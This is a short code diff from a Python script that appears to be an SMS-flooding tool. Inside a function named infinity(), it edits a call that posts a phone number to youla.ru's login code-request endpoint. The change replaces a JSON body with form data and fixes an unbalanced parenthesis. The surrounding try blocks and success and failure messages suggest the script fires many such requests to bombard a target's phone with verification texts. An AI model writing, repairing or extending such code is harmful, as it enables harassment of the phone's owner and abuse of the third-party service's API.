@@ -501,7 +501,7 @@ def infinity():
 			print('[✖] Failed !')
 
 		try:
-			requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":numplus}))
+			requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
 			print('[✔] Successful')
 		except:
 			print('[✖] Failed !')
